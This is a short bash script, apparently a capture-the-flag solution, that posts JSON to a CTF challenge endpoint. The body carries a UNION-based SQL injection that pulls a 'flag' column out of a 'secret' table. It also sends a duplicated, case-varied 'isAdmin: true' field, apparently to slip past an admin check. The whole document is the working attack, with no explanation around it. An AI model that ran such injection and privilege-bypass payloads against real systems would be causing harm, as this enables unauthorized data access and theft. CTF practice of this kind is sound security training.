#!/usr/bin/env bash
curl "http://ctf.tcp1p.com:10994/note" -XPOST --json '{"Id":"1 UNION SELECT 1,flag,1 from secret ORDER BY 2","IsAdmin":false,"isAdmin":true}'
